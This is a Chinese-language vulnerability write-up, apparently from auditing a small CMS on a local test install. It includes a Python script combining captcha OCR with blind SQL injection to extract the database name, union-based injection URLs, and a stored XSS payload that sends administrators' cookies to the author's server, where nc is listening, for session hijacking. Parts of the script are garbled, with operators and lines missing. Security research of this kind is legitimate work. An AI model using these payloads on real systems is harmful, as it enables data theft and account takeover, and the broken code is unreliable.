这里必须要安装`pytesseract库`和`tesseract`，这样的话ocr识别很快
    import requests
    from PIL import Image
    import pytesseract
    from time import time
    r = requests.Session()
    url_code = 'http://localhost:81/system/code.php?act=yes'
    url_login = 'http://localhost:81/system/loginpass.php'
    length = ''
    name = ''
    # 这里获取验证码，并将原图转为灰度图像，然后再指定二值化的阈值
    def code():
        req = r.get(url_code)
        with open('1.png', 'wb') as f:
            f.write(req.content)
        #新建Image对象
        image = Image.open("1.png")
        #进行置灰处理
        image = image.convert('L')
        #这个是二值化阈值
        threshold = 150
        table = []
        for i in  range(256):
            if i  2.5:
                    length += chr(i)
                    print(length)
    # 这里调用database_length()函数来获取数据库名的长度
    database_length()
    print(length)
    # 这里返回数据库名
    def database_name():
        global name
        payload_database_name = "1' and case when (ascii(mid((database()),{num1},1)) 2.5:
                        right = mid
                    else:
                        left = mid
    # 这里调用database_name()函数来获取数据库名
    database_name()
    print(name)
## 第三处sql注入
`/system/hf_book.php`关键代码如下,大概在这个页面的18行左右
    ....
    ....
    ....
    $sxid=$_GET["id"];
    $e_rs=$db->get_one("select * from ***cms_book where id=$sxid",MYSQL_ASSOC);
    $bid=$e_rs['id'];
    ....
    ....
先猜测字段数目,11正确，12错误，说明字段数是11
    http://localhost:81/CMS/***cms/system/hf_book.php?id=11 order by 11#
    http://localhost:81/CMS/***cms/system/hf_book.php?id=11 order by 12#
看回显部分，字段3和字段5存在回显
    http://localhost:81/CMS/***cmcs/system/hf_book.php?id=11 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11#
注入出数据库名
    http://localhost:81/CMS/***cms/system/hf_book.php?id=11 and 1=2 union select 1,2,database(),4,5,6,7,8,9,10,11#
## 小结
这里其实还有非常多的sql注入，包括insert注入，delete注入，update注入，由于文章篇幅的原因，没有一一例举。因为源头insert或者update或者delete没有做好过滤，导致了这篇漏洞，所以这里也就不再重复说明，举了几个比较典型的案例来说明
# 前台存储型xss
`/add_do.php`
     intval(trim($_POST['type_id'])),
            'b_title' => injCheck($_POST['b_title']),
            'b_content' => injCheck($_POST['b_content']),
            'b_name' => injCheck($_POST['b_name']),
            'b_tel' => injCheck($_POST['b_tel']),
            'b_mail' => injCheck($_POST['b_mail']),
            'b_qq' => injCheck($_POST['b_qq']),
            'b_ip' => injCheck($_POST['b_ip']),
            'c_date' => time()
            );
    $db->insert("***cms_book", $siteinfo);
    $db->close();
    ok_info('/index.php','恭喜你，留言提交成功！');
    ?>
第17行到第24行，只对sql注入进行了过滤，并没有对xss过滤，导致了这些提交字段都存在xss漏洞
然后我们到该页面，进行提交
这里我是用我的服务器进行监听，`4.js`内容如下
    var image=new Image();
    image.src="http://你的vps-ip:10006/cookies.phpcookie="+document.cookie;
然后在我自己的服务器上nc监听
然后当管理员在后台点击访问新回复的时候
然后可以打到cookie并且可以成功登录
## 小结
其实这里也有后台存储型xss，但是很鸡肋，就不说了